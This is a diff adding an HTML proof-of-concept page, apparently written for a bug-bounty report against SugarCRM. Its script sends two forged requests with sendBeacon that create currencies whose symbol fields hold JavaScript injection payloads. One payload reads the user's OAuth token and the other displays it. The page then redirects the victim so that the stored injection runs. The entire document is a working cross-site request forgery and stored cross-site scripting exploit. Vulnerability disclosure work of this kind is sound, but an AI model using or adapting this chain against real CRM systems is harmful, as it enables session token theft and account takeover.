@@ -1,0 +1,38 @@
+<html>
+  <body>
+<script>
+  const data1 = new URLSearchParams({
+    module: "Currencies",
+    action: "index",
+    edit: "true",
+    status: "Active",
+    name: "Test currency 1",
+    iso4217: "X1",
+    conversion_rate: "222.0",
+    symbol: "';a=top.App.api.getOAuthToken();//",
+    button: "Save"
+  });
+  
+    const data2 = new URLSearchParams({
+    module: "Currencies",
+    action: "index",
+    edit: "true",
+    status: "Active",
+    name: "Test currency 2",
+    iso4217: "X2",
+    conversion_rate: "222.0",
+    symbol: "';alert(a);//",
+    button: "Save"
+  });
+
+  navigator.sendBeacon("https://bugbounty-new-7.managed.ms.sugarcrm.com/index.php", data1);
+  setTimeout(() => {
+    navigator.sendBeacon("https://bugbounty-new-7.managed.ms.sugarcrm.com/index.php", data2);
+  }, 1000);
+  setTimeout(() => {
+    location='https://bugbounty-new-7.managed.ms.sugarcrm.com/#bwc/index.php?action=wizard&module=Users&skipwelcome=0';
+  }, 2000);
+  
+</script>
+  </body>
+</html>
